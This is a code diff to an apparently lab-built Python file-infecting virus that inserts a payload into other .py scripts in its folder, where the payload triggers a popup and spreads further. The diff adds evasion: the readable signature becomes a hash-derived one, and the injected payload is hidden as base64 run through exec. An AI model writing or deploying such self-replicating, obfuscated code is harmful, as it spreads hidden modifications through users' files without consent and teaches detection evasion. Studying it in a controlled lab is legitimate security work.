@@ -1,19 +1,30 @@
 #!/usr/bin/env python3
+import base64
+import hashlib
 import random
+import shutil
 from pathlib import Path
 
-SIGNATURE = "# === COUCOU_VIRUS_LAB ==="
+
+_SIG_SEED = "cou"
+SIGNATURE = "# === " + hashlib.sha256(_SIG_SEED.encode()).hexdigest()[:16] + " ==="
+
 EXCLUDE = {"virus.py", "run_virus.py"}
 
-PAYLOAD_SNIPPET = r"""
+_PAYLOAD_RAW = b"""
 try:
-    from pathlib import Path
     import virus as _v
+    from pathlib import Path as _P
     _v.schedule_popup()
-    _v.infect_random_target(Path(__file__).parent)
+    _v.infect_random_target(_P(__file__).parent)
 except Exception:
     pass
 """
+
+PAYLOAD_SNIPPET = (
+    "import base64 as _b\n"
+    f"exec(_b.b64decode('{base64.b64encode(_PAYLOAD_RAW).decode()}'))\n"
+)
 
 
 def _show_popup():
@@ -64,7 +75,8 @@ def _is_infected(path):
 def discover_targets(here):
     return [p for p in here.glob("*.py")
             if p.is_file()
-            and p.name not in EXCLUDE]
+            and p.name not in EXCLUDE
+            and not p.name.endswith(".py.bak")]
 
 
 def _split_header(lines):
